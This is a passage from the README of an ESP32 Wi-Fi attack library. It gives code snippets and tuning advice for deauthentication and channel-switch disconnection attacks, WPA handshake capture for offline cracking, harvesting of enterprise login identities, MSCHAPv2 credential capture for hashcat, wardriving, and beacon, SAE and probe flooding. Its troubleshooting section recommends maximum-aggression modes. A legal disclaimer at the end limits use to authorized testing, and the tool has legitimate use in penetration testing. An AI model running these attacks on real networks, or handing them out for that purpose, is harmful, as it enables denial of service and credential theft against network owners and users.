// CSA first; fallback to Deauth halfway through csa_wait_ms if no capture (default)
engine.setDisconnectionStrategy(STRATEGY_AUTO_FALLBACK);

// CSA and Deauth simultaneously (legacy behavior)
engine.setDisconnectionStrategy(STRATEGY_SIMULTANEOUS);
```

### Half-Handshakes and Smart Pivot

When `cfg.capture_half_handshakes = true`, M2-only captures fire the EAPOL callback with `type = CAP_EAPOL_HALF`, then the engine immediately launches CSA/Deauth to force a fresh 4-way handshake. `HandshakeRecord.cipher` is also populated from the cached RSN pairwise suite so offline tooling can distinguish TKIP vs CCMP captures.

### Smart Channel Lists

```cpp
uint8_t hottest[8];
uint8_t n = engine.getChannelsSortedByActivity(hottest, 8);
if (n) engine.setAutoChannelList(n);
```

This is useful after a warm-up scan when you want hopping restricted to the busiest channels only.

### 802.11r Fast Transition Detection

`ApRecord.ft_capable` is set when FT-PSK (suite type 4) or FT-EAP (suite type 3) AKMs are detected. For FT-only APs, save the PCAPNG capture and use `hcxpcapngtool --enable_ft` for offline cracking.

---

## Usage Examples

### Enterprise Identity Harvesting

```cpp
engine.setIdentityCallback([](const EapIdentityRecord &rec) {
    Serial.printf("[802.1X] %s method=%u\n", rec.identity, rec.eap_method);
    EnterpriseCsvLogger::append(SD, "/identities.csv", rec);
});
Config cfg;
cfg.hop_dwell_ms = 800; // longer dwell gives EAP exchanges time to complete
engine.begin(cfg);
```

### GPS Wardriving

```cpp
#include <TinyGPS++.h>
TinyGPSPlus gps;

engine.setApFoundCallback([&](const ApRecord &ap) {
    if (gps.location.isValid())
        WigleCsvLogger::appendAp(SD, "/wardrive.csv", ap,
                                 gps.location.lat(), gps.location.lng());
});
```

### Selective Attack Filtering

```cpp
engine.setTargetFilter([](const ApRecord &ap) -> bool {
    if (ap.rssi < -70) return false;    // too weak
    if (ap.enc < 2)    return false;    // skip Open/WEP
    if (ap.pmf_required) return false;  // skip pure WPA3
    return true;
});
```

### Streaming Packet Capture

```cpp
PcapngFileLogger raw;
raw.open(SD, "/intel.pcapng");
engine.setPacketLogger([&](const uint8_t *data, uint16_t len, int8_t rssi, uint8_t ch, uint32_t ts) {
    raw.writePacket(data, len, rssi, ch, ts);
});
```

---

## Performance Considerations

| Concern | Guidance |
|---------|----------|
| **SD writes** | Use streaming `open/write/close` — never one-shot in a tight loop |
| **Beacon logging** | `LOG_FILTER_BEACONS` generates 500+ writes/s — requires SDMMC (4-bit DMA) |
| **Enterprise capture** | Set `hop_dwell_ms = 800–1200` to not cut off EAP exchanges mid-flight |
| **Flash size** | Use feature gates (`POLITICIAN_NO_DB`, etc.) to trim binary on tight builds |
| **RAM** | Core engine ~45KB. Storage helpers and callbacks are opt-in |
| **5GHz** | `channel_frames[200]` covers all channels; use `setChannelBands(false, true)` to hop 5GHz only |

## Hardware Requirements

- **Platform**: ESP32, ESP32-S2, ESP32-S3, ESP32-C3
- **Framework**: Arduino or ESP-IDF (storage helpers are Arduino-only)
- **Flash**: 4MB minimum recommended
- **Optional**: SD card module for persistent logging; GPS module for Wigle integration

## Troubleshooting

**No handshakes captured**
- Try `ATTACK_ALL` for maximum aggression
- Increase `hop_dwell_ms` for slow-reconnecting devices
- Check `skip_immune_networks` — pure WPA3 APs are auto-skipped by default

**Enterprise identities not captured**
- Increase `hop_dwell_ms` to 800-1200ms
- Use `ATTACK_PASSIVE` or `ATTACK_STIMULATE` only — aggressive attacks disrupt EAP exchanges

**WPS / MSCHAPv2 callbacks never fire**
- WPS requires a WPS Enrollee actively associating during capture
- MSCHAPv2 only fires against bare (no-tunnel) EAP-MSCHAPv2 — rare in modern deployments
- Verify the callback is registered before `begin()`

**SD card writes fail**
- Confirm `SD.begin()` succeeds before any logger call
- Disable `LOG_FILTER_BEACONS` if using SPI SD — use SDMMC for high-volume logging

### Stress Helpers

```cpp
using namespace politician::stress;
beaconFlood(ssids, ssidCount, 6, 5000);
```

`PoliticianStress.h` now exposes beacon flood generation alongside SAE commit flooding and probe flood helpers.

## Examples

| Example | Description |
|---------|-------------|
| `AutonomousHunter` | Score-based auto-targeting with fingerprinting |
| `AutoEnterpriseHunter` | Automatic enterprise network targeting |
| `DeviceFingerprinting` | Passive IoT/consumer brand identification |
| `TargetedAuditing` | Network filtering and callbacks |
| `EnterpriseAuditing` | 802.1X identity harvesting |
| `StorageAndNVS` | Streaming PCAPNG logging and NVS persistence |
| `WigleIntegration` | GPS wardriving with Wigle CSV export |
| `ExportFormats` | PCAPNG capture and HC22000 text export |
| `DynamicControl` | Runtime attack mode switching |
| `FuzzingAndInjection` | Custom frame injection and fuzzing |
| `SerialStreaming` | Real-time packet streaming |
| `StressTest` | Performance and memory testing |
| `BtmSteering` | 802.11v BTM Request injection + PMKID combination |
| `WpsCapture` | Passive WPS M1 device fingerprint harvesting |
| `MsChapCapture` | Bare EAP-MSCHAPv2 credential capture (hashcat -m 5500) |

## Legal & Ethical Use

This library is intended for:
- ✅ Authorized penetration testing
- ✅ Security research in controlled environments
- ✅ Educational purposes with permission
- ✅ Auditing your own networks

**Unauthorized access to networks you do not own or have permission to test is illegal** under laws such as the Computer Fraud and Abuse Act (CFAA) in the United States and similar legislation worldwide.

The authors and contributors assume no liability for misuse of this software.

## Contributing

Contributions are welcome! Fork the repository, create a feature branch, add tests/examples for new features, and submit a pull request.

## License

MIT License — see [`LICENSE`](LICENSE) for details.

## Acknowledgments

Special thanks to [justcallmekoko](https://github.com/justcallmekoko) for inspiring this project and the broader hardware hacking community through the [ESP32 Marauder](https://github.com/justcallmekoko/ESP32Marauder) project.


